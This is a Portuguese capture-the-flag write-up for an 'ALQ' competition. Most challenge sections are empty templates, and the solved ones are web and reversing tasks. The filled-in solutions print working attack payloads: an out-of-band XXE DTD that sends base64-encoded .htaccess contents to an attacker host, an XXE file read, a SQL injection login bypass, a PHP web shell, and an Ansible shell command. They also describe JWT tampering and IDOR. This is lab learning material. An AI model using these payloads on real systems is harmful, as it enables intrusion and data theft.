## Sumário

* [Boot2Root](#boot2root)
    * [UnHide (300)](#unhide-300)
* [Cripto](#cripto)
    * [Cripto 001 (10)](#cripto-001-10)
    * [RSA 001 (10)](#rsa-001-10)
    * [Presente de Aniversário (25)](#presente-de-aniversário-25)
    * [RSA 002 (25)](#rsa-002-25)
    * [Enigma (50)](#enigma-50)
    * [Senha Perdida (50)](#senha-perdida-50)
    * [Mensagem Codificada (100)](#mensagem-codificada-100)
    * [Receita de Bolo (100)](#receita-de-bolo-100)
* [Forense](#forense)
    * [Arquivo Compactado (10)](#arquivo-compactado-10)
    * [Uma Simples Análise (10)](#uma-simples-análise-10)
    * [Break the Hash (25)](#break-the-hash-25)
    * [Um ataque ao banco (25)](#um-ataque-ao-banco-25)
    * [Validação de Dados (25)](#validação-de-dados-25)
    * [Backdoor (50)](#backdoor-50)
    * [Escovando Bits de Rede (50)](#escovando-bits-de-rede-50)
    * [Qual o conteúdo? (50)](#qual-o-conteúdo-50)
    * [Investigação (100)](#investigação-100)
    * [Vazamento de Informações (100)](#vazamento-de-informações-100)
* [Lógica](#lógica)
    * [Sequência (10)](#sequência-10)
    * [Sequência de Collatz (10)](#sequência-de-collatz-10)
    * [Rotas (50)](#rotas-50)
* [Mini Gamer](#mini-gamer)
    * [Adivinha (10)](#adivinha-10)
    * [Pokedex (50)](#pokedex-50)
* [Mini Web](#mini-web)
    * [Navi GPS (10)](#navi-gps-10)
    * [Ship (10)](#ship-10)
    * [Safe URL (25)](#safe-url-25)
    * [Solutions (25)](#solutions-25)
    * [Developer (50)](#developer-50)
    * [MDK (50)](#mdk-50)
    * [External (100)](#external-100)
    * [Mico (100)](#mico-100)
    * [Notes (150)](#notes-150)
    * [Techport (150)](#techport-150)
    * [Defense and Attack (200)](#defense-and-attack-200)
* [Osint](#osint)
    * [Informações de um arquivo! (10)](#informações-de-um-arquivo-10)
    * [Rastreio de IP (10)](#rastreio-de-ip-10)
    * [Dispositivo Antigo (25)](#dispositivo-antigo-25)
    * [Encontre a fotógrafa (25)](#encontre-a-fotógrafa-25)
    * [Hidden Flag (50)](#hidden-flag-50)
    * [Investigação de Voo (50)](#investigação-de-voo-50)
    * [A melhor rua para um gato! (100)](#a-melhor-rua-para-um-gato-100)
* [Outros](#outros)
    * [Look_Find_Replace (10)](#look_find_replace-10)
    * [Looping (10)](#looping-10)
    * [As mãozinhas (25)](#as-mãozinhas-25)
    * [Não é IPv4 (25)](#não-é-ipv4-25)
    * [O Banco Alq (50)](#o-banco-alq-50)
    * [O código obscuro (50)](#o-código-obscuro-50)
    * [Roubo ao Museu (50)](#roubo-ao-museu-50)
    * [Onion Services (100)](#onion-services-100)
    * [Publicidade de Limpeza (100)](#publicidade-de-limpeza-100)
* [Pwn](#pwn)
    * [Pwn01 (10)](#pwn01-10)
    * [Pwn02 (10)](#pwn02-10)
    * [Pwn03 (25)](#pwn03-25)
    * [Oculto.exe (50)](#ocultoexe-50)
    * [Pwn04 (50)](#pwn04-50)
* [Stego](#stego)
    * [Descoberta Histórica (10)](#descoberta-histórica-10)
    * [Quase Igual (10)](#quase-igual-10)
    * [Vaso de decoração (25)](#vaso-de-decoração-25)
    * [Fake Story (50)](#fake-story-50)
    * [Na Deepweb 2 (50)](#na-deepweb-2-50)
    * [Tinta Invisível (50)](#tinta-invisível-50)
    * [A Animação (100)](#a-animação-100)
    * [O lado oculto da lua (100)](#o-lado-oculto-da-lua-100)
    * [Arte (150)](#arte-150)

# Boot2Root

## UnHide (300)
### Descrição
Aplicação PHP com endpoint que permite utilização Arbitrária de Classes e Funções.

### Solução detalhada

Primeiramente, ao acessar unhide.app é possível observar que um código php está sendo executado ao realizar POST requests na pagina.

<img src="images/Pasted image 20230822154123.png">

O código PHP é vulnerável na medida em que permite que um atacante malicioso chame alguma classe com função nociva e cause danos e / ou exfiltre dados da aplicação.

Dessa forma, esses dados estão sendo acessados via json, analise o seguinte request


<img src="images/Pasted image 20230822154210.png">

Na imagem é utilizado a classe DOMDocument, por meio dela é possível fazer chamadas com a função load() que renderiza xml ao passar uma url como argumento.

Nesse contexto, torna-se evidente a possibilidade de exploração de XXE para SSRF ou Local File read.

Para explorar, o conteudo de xml.xml é

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://iphere:8000/xpl.dtd"> %ext;
%ext;
]>
<r></r>
```

E o conteudo de xpl.dtd é

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.htaccess">
<!ENTITY % payload "<!ENTITY &#37; xpl SYSTEM 'http://iphere:8000/?leak=%data;'">
%payload;
%xpl;
```

O qual usa o php para ler o arquivo `/var/www/html/.htaccess` , que contém a flag.

<img src="images/Pasted image 20230822154617.png">

<img src="images/Pasted image 20230822154625.png">

### Flag
```
ALQ{PHP_1nt3rn4ls_F0r_Fun_4nd_Pr0f1t}
```

# Cripto

## Cripto 001 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## RSA 001 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Presente de Aniversário (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## RSA 002 (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Enigma (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Senha Perdida (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Mensagem Codificada (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Receita de Bolo (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Forense

## Arquivo Compactado (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Uma Simples Análise (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Break the Hash (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Um ataque ao banco (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Validação de Dados (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Backdoor (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Escovando Bits de Rede (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Qual o conteúdo? (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Investigação (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Vazamento de Informações (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Lógica

## Sequência (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Sequência de Collatz (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Rotas (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Mini Gamer

## Adivinha (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pokedex (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Mini Web

## Navi GPS (10)
### Descrição

### Solução detalhada

Na aplicação, percebe-se que há a utilização do parametro 'q' para chamar arquivos php no systema.

<img src="images/Pasted image 20230822154905.png">

Dessa maneira, é vulneravél a LFI:

<img src="images/Pasted image 20230822154933.png">

## Ship (10)
### Descrição

### Solução detalhada
Reside na aplicação o endpoint de login

<img src="images/Pasted image 20230822155111.png">

Após análise do código do front end, é achado o arquivo /assets/js/login.js sendo usado.

Lendo esse arquivo, encontram-se credenciais expostas as quais permitem que o atacante acesse o painel

<img src="images/Pasted image 20230822155159.png">

<img src="images/Pasted image 20230822155219.png">

## Safe URL (25)
### Descrição

### Solução detalhada

Aplicação roda um endpoint que provavelmente é vulnerável a SSRF.

<img src="images/Pasted image 20230822155258.png">


Antes de testar pelo ssrf, o código fonte da aplicação mostra algo interessante, um arquivo config.php.

<img src="images/Pasted image 20230822155418.png">

Assim, podemos testar por meio do SSRF e chamar http://127.0.0.1/config.php
<img src="images/Pasted image 20230822155523.png">

E assim obtemos a flag

## Solutions (25)
### Descrição

### Solução detalhada

Nesse cenário, identifica-se a tecnologia ansible sendo usada por meio de uploads sem nenhuma restrição ou filtro, o mesmo pode causar execução remota de comandos na aplicação.

<img src="images/Pasted image 20230822155913.png">


Usando o seguinte yaml
```yaml
- hosts: localhost
  tasks:
    - name: RShell2
      shell: bash -c 'cat /flag.txt >> /var/www/html/index2.html'
```
Podemos pegar a flag criando uma nova index no servidor, e depois ler ela

1. Envie o arquivo para a aplicação
2. Execute-o
3. Acesse index2.html


<img src="images/Pasted image 20230822160126.png">


<img src="images/Pasted image 20230822160140.png">

Flag - ALQ{D3v0ops_4ns1ble_pl4yb00k_Rc3}

## Developer (50)
### Descrição

### Solução detalhada

Observa-se um painel de login na aplicação, que, ao testar, bypassamos o login que é vulnerável a SQL Injection com o payload: ' or 1 -- -

<img src="images/Pasted image 20230822160343.png">


<img src="images/Pasted image 20230822160251.png">


Na pagina settings, iremos abusar da função de File Upload para executar o ataque Unrestricted File upload, permitindo-nos colocar uma web shell no servidor que ira executar comandos.

<img src="images/Pasted image 20230822161455.png">


Crie um arquivo com o seguinte conteudo
```php
<?php echo system($_GET['rce']);?>
```

Acesse-o pelo endpoint /uploads/

<img src="images/Pasted image 20230822161305.png">

Flag - ALQ{P0UC4VULNPR4MU1TOC0D3}

## MDK (50)
### Descrição

### Solução detalhada

Ao entrar na pagina, identificamos uma pagina de login e register

<img src="images/Pasted image 20230827093404.png">


Ao logar, a pagina exibida mostra algumas funções,<img src="images/Pasted image 20230827093501.png">

A função All tools retorna Access Denied, o que nos faz perceber que existe alguma Authenticação que cuida de premium users, que portanto pode ser explorada.
<img src="images/Pasted image 20230827093624.png">Retornando a página, analisando os cookies, identifica-se o uso de jwt, assim, decido jogar ele no site jwt.io

<img src="images/Pasted image 20230827093819.png">

E a tal categoria premium está setada para false,
Usando o cyberchef, iremos alterar esse valor para true

<img src="images/Pasted image 20230827113357.png">

Depois, acesse a página novamente

<img src="images/Pasted image 20230827113425.png">

E obtemos a flag.

## External (100)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827121828.png">

Ná pagina principal, existe o botão Contact.
Clicando nele, chegamos a pagina contact.php

<img src="images/Pasted image 20230827121905.png">

<img src="images/Pasted image 20230827122103.png">
Ao interceptar a request, percebe-se que está sendo usado XML. Nesse contexto, o backend está renderizando os dados enviados pelo cliente usando XML sem nenhum tipo de proteção.

Nesse caso, é evidente o possível ataque de XXE, o qual explora esse tipo de função para atingir Local File Read ou SSRF.

Enviando o request, o nome é retornado, então é possível usar o nome para refletir um conteúdo do sistema ( Local File Read )


<img src="images/Pasted image 20230827122217.png">

Exploração:

<img src="images/Pasted image 20230827122342.png">

Payload usado:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag.txt"> ]>
<contact><first_name>&ent;</first_name><last_name>test</last_name><email>test@gmail.com</email><message>testando</message></contact>
```

Flag: ALQ{XML_3xt3rn4L_3nt1ty_Att4ck_}

## Mico (100)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827094017.png">

Neste CTF MICO, na aplicação existem varios endpoins .html, e uma aparente forma de login e sign up que no entanto não funciona.

Depois de analisar e passar pelas paginas, não foi encontrado nada. Assim, ao não encontrar nada, meu time teve a ideia de começar a analisar o que já teria passado pelo site, então, fizemos o uso de crawlers.

Crawler:
```
https://ctf-mico.alquymia.com.br/
https://ctf-mico.alquymia.com.br/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js
https://ctf-mico.alquymia.com.br/contact.html
https://ctf-mico.alquymia.com.br/css/bootstrap.css
https://ctf-mico.alquymia.com.br/css/font-awesome.min.css
https://ctf-mico.alquymia.com.br/css/responsive.css
https://ctf-mico.alquymia.com.br/css/style.css
https://ctf-mico.alquymia.com.br/doctor.html
https://ctf-mico.alquymia.com.br/favicon.ico
https://ctf-mico.alquymia.com.br/fonts/fontawesome-webfont.woff2?v=4.7.0
https://ctf-mico.alquymia.com.br/images/about-img.jpg
https://ctf-mico.alquymia.com.br/images/contact-img.jpg
https://ctf-mico.alquymia.com.br/images/dots.png
https://ctf-mico.alquymia.com.br/images/logo.png
https://ctf-mico.alquymia.com.br/images/next.png
https://ctf-mico.alquymia.com.br/images/post1.jpg
https://ctf-mico.alquymia.com.br/images/post2.jpg
https://ctf-mico.alquymia.com.br/images/post3.jpg
https://ctf-mico.alquymia.com.br/images/post4.png
https://ctf-mico.alquymia.com.br/images/prev.png
https://ctf-mico.alquymia.com.br/images/slider-img.jpg
https://ctf-mico.alquymia.com.br/images/t1.png
https://ctf-mico.alquymia.com.br/images/t2.png
https://ctf-mico.alquymia.com.br/images/t3.png
https://ctf-mico.alquymia.com.br/images/t4.png
https://ctf-mico.alquymia.com.br/images/team1.jpg
https://ctf-mico.alquymia.com.br/images/team2.jpg
https://ctf-mico.alquymia.com.br/images/team3.jpg
https://ctf-mico.alquymia.com.br/images/treatment-side-img.jpg
https://ctf-mico.alquymia.com.br/js/bootstrap.js
https://ctf-mico.alquymia.com.br/js/custom.js
https://ctf-mico.alquymia.com.br/js/jquery-3.4.1.min.js
https://ctf-mico.alquymia.com.br/robots.txt
https://ctf-mico.alquymia.com.br/testimonial.html
```

Nele, verificamos a existencia de https://ctf-mico.alquymia.com.br/robots.txt, que ao entrar na url, dizia 404. Nesse contexto, começamos a pensar o por que não estaria ali, que nos levou ao seguinte pensamento: "Será que algums arquivos / folders foram escondidos?", assim passamos a usar o wayback machine para verificar.

Ao usar o wayback machine para verificar a existência de robots.txt, obtivemos uma resposta muito interessante:

<img src="images/Pasted image 20230827094540.png">

<img src="images/Pasted image 20230827094558.png">

Foi comprovada a existência de um folder com nome db-0898343234/

ao acessar ele, é retornado forbidden, mas ao entrar em db-0898343234/flag.txt, encontramos a flag.

<img src="images/Pasted image 20230827094701.png">

Flag: ALQ{hidden_wayback}

## Notes (150)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827094924.png">

Primeira página da aplicação, mostra Sign in e Sign up.
Dessa maneira, vamos criar uma conta e logar.

<img src="images/Pasted image 20230827095117.png">

A aplicação roda algo como um sistema de notas, o qual utiliza ID's para chamar notes salvadas.

<img src="images/Pasted image 20230827095155.png">

Assim, torna-se evidente uma possível exploração de IDOR, visto que existe a utilização de ID's para identificação de objetos no servidor sem nenhum tipo de filtro ou proteção.

Ao percorrer os ID's possíveis, encontra-se a flag no ID 35

<img src="images/Pasted image 20230827095417.png">

Flag: ALQ{1ns3cur3_d1r3cT_0bj3cT_R3f3r3nc3s}

## Techport (150)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827095608.png">

Primeira página da aplicação, mostra algums lorem ipsum, e um botão de dashboard no canto superior direito.

Ao clicar, é obtido um erro:
<img src="images/Pasted image 20230827095641.png">

A Aplicação web está utilizando de um parametro chamado auth para setar se o usuário está autenticado ou não.

Assim, executamos o ataque trocando o valor para true, para dizer que estamos autenticados para o servidor web.

<img src="images/Pasted image 20230827095752.png">

## Defense and Attack (200)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Osint

## Informações de um arquivo! (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Rastreio de IP (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Dispositivo Antigo (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Encontre a fotógrafa (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Hidden Flag (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Investigação de Voo (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## A melhor rua para um gato! (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Outros

## Look_Find_Replace (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Looping (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## As mãozinhas (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Não é IPv4 (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O Banco Alq (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O código obscuro (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Roubo ao Museu (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Onion Services (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Publicidade de Limpeza (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Pwn

## Pwn01 (10)
### Descrição
nc 45.63.104.42 2331

### Arquivos anexados
pwn01.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
  
char buf[32];
  
int main()
{
        int fd;
        int len = 0;
        int num;
        scanf("%d", &num);
        fd = num - 0xcafe;
        len = read(fd, buf, 32);
        if(!strcmp("ALQUYMIA\n", buf))
        {
                printf("Parabens, pegue sua flag: ");
                printf("ALQ{?}\n");
        }
        return 0;
  
}
```

### Flag
```
ALQ{f1l3_d3script0r_654}
```
### Solução detalhada
Ao analisar o código C, podemos observar a presença da função ```scanf``` onde permite o usuário a preencher um campo com algum número inteiro.
```
scanf("%d", &num);
```
Na linha seguinte, o valor da variável ```fd``` será ```num - 0xcafe```, essa variável será usada no primeiro argumento da próxima função, chamada ```read```.

Estrutura da função read:
```
ssize_t read(int fd, void buf[.count], size_t count);
```

A imagem a seguir mostra algumas informações sobre file descriptor:

<img src="images/Pasted image 20230827122505.png">

Com base nessa analise, precisamos fazer com que o valor da variável ```fd``` seja igual a 0, que interpretado pelo binário, será o "Standard Input", conhecido como "stdin".

```
0 = X - 0xcafe
```

Podemos usar a linguagem de programação Python para descobrirmos o número inteiro por trás de ```0xcafe```.
```
$ python3 -c "print(0xcafe)"
51966
```

Agora que temos o número, conseguiremos resolver a simples conta de matemática:
```
0 = X - 0xcafe
0 = X - 51966
0 = 51966 - 51966
```

A próxima linha do código usa a função strcmp para comparar se o usuário preencheu o campo com a palavra "ALQUYMIA".
```
if(!strcmp("ALQUYMIA\n", buf))
```

Agora o que precisamos fazer é se conectar com o servidor e enviar o número para que seja interpretado como file descriptor stdin e enviar a palavra "ALQUYMIA" para retornar a flag:

<img src="images/Pasted image 20230827131846.png">

## Pwn02 (10)
### Descrição
nc 45.63.104.42 3442

### Arquivos anexados
pwn02.c
```
#include <stdio.h>
#include <stdlib.h>

int main()
{
        long int passw;
        long int passw_ = 0x9999dead9999;
        scanf("%ld", &passw);
        if(passw == passw_)
        {
                printf("Parabens, pegue sua flag: ");
                printf("ALQ{?}\n");
        }
        return 0;
}
```

### Flag
```
ALQ{3ntend3ndo_hex4d3cima1s_3}
```
### Solução detalhada
Analisando o código C, percebemos que há uma variável inteiro longo chamado "passw_" com o valor "0x9999dead9999". Na linha seguinte, existe a função "scanf" onde irá armazenar um valor inteiro longo que o usuário enviar. Posteriormente esses dois valores será comparados, e se for iguais, a flag será retornada.

O valor da variável "passw_" lembra um valor hexadecimal, portanto, podemos usar a linguagem de programação Python para decodificar esse valor.

```
python3 -c "print(0x9999dead9999)"
168886144965017
```

Agora precisamos apenas se conectar ao servidor e enviar o valor decodificado.

<img src="images/Pasted image 20230827131818.png">

## Pwn03 (25)
### Descrição
nc 45.63.104.42 7213

### Arquivos anexados
pwn03
### Flag
```
ALQ{b4sic_r3verse_21}
```
### Solução detalhada
Para esse desafio, foi usado a ferramenta de engenharia reversa Ghidra para obter o código da ```int main()``` e foram feitos algumas modificações para obter um melhor entendimento sobre o código do binário:

```

int main(void)

{
  int result;
  size_t tamanhoUserInput;
  char userinput [34];
  char valorParaComparar [13];
  char local_19;
  undefined4 uStack_18;
  undefined3 uStack_14;
  undefined5 uStack_11;
  int i;
  
  local_19 = 'C';
  uStack_18 = 0x5443534e;
  uStack_14 = 0x434a4d;
  uStack_11 = 0x393535334f;
  fgets(userinput,32,stdin);
  tamanhoUserInput = strcspn(userinput,"\n");
  userinput[tamanhoUserInput] = '\0';
  for (i = 0; i < 13; i = i + 1) {
    valorParaComparar[i] = (&local_19)[i] + -2;
  }
  local_19 = '\0';
  result = strcmp(userinput,valorParaComparar);
  if (result == 0) {
    puts("Pegue sua flag: ALQ{?}");
  }
  else {
    puts("Errouuuuuu!!");
  }
  return 0;
}
```

Observando as variáveis, encontrados alguns valores dentro de ```local_19```, ```uStack_18```, ```uStack_14```, e ```uStack_11```. Para decifrar os valores de ```uStack_1*```, usamos a ferramenta CyberChef seguindo a seguinte receita:

<img src="images/Pasted image 20230827130558.png">

Valores:
```
0x5443534e
0x434a4d
0x393535334f
```

Após decodificar e reverter os valores, o resultado foi ```NSCTMJCO3559```, porém precisava adicionar a letra "C" no início do valor, o que resultou em ```CNSCTMJCO3559```.

Analisando o seguinte comportamento do binário, observamos que ele pegava cada letra e número da variável ```local_19``` (que seria ```CNSCTMJCO3559```) e voltava duas casas atrás, ou seja, C = A, N = L, e S = Q.
```
for (i = 0; i < 13; i = i + 1) {
    valorParaComparar[i] = (&local_19)[i] + -2;
}
```

Observando esse comportamento, remodelamos o valor de ```CNSCTMJCO3559``` para ```ALQARKHAM1337```. Com esse valor, conectamos ao servidor e enviamos ele.

<img src="images/Pasted image 20230827131735.png">

## Oculto.exe (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pwn04 (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Stego

## Descoberta Histórica (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Quase Igual (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Vaso de decoração (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Fake Story (50)
### Descrição

<img src="images/Pasted image 20230827100005.png">

### Solução detalhada

É nos dada uma imagem para analisar, primeiramente, rodo o TweakPNG para verificar

<img src="images/Pasted image 20230827101530.png">

Vários erros aparecem, depois de muita busca, concertando o IHDR e tentando concertar os IDAT's na mão, percebi que na verdade era super simples, o problema residia no tamanho da imagem.

Usando o próprio TweakPNG, troque o tamanho da imagem para 1024x1024.

<img src="images/Pasted image 20230827101634.png">

Depois disso, Salve a imagem e a abra denovo,

E olha só, obtemos a imagem original concertada.
Analisando atentamente, aparentemente tem um qrcode escondido na imagem.
<img src="images/Pasted image 20230827101736.png">

Agora com a imagem concertada, usaremos o StegSolve para tentar pegar o qrcode.

<img src="images/Pasted image 20230827102153.png">

Use a setinha no canto inferior, e boom

<img src="images/Pasted image 20230827102320.png">

<img src="images/Pasted image 20230827102437.png">

Flag: https://ALQ{imagem_0cult@}

## Na Deepweb 2 (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Tinta Invisível (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## A Animação (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O lado oculto da lua (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Arte (150)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada
